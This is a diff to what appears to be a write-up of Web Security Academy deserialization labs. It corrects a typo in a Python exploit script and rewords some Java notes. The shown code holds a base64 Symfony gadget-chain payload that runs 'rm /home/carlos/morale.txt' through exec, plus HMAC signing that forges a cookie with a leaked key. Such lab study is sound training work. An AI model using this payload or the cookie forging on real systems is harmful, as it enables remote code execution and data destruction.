@@ -340,7 +340,7 @@ url = f'https://{HOST}.web-security-academy.net'
 payload = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg=="
 key = "d2fxzcoucq4q9tu02ohy515fdr5uyha4"
 
-signature = hmac.new(bytes(key, "UTF=8"), payload.encode(), hashlib.sha1).hexdigest()
+signature = hmac.new(bytes(key, "UTF-8"), payload.encode(), hashlib.sha1).hexdigest()
 
 
 json_cookie = json.dumps({"token": payload, "sig_hmac_sha1": signature})
@@ -565,7 +565,7 @@ public ProductTemplate(String id)
 }
 ```
 
-Note that it uses a `Product` variable. Since I do not actually care about the `product` variable, this class can be empty like:
+Note that it uses a `Product` variable. Since I do not actually care about the `product` variable, this class can be empty:
 
 ```java
 package data.productcatalog;
@@ -600,7 +600,7 @@ class Main {
 
 // CLASSES USED
 
-// Product class used just to let ProductTemplate compile
+// Product class
 package data.productcatalog;
 public class Product {
 }
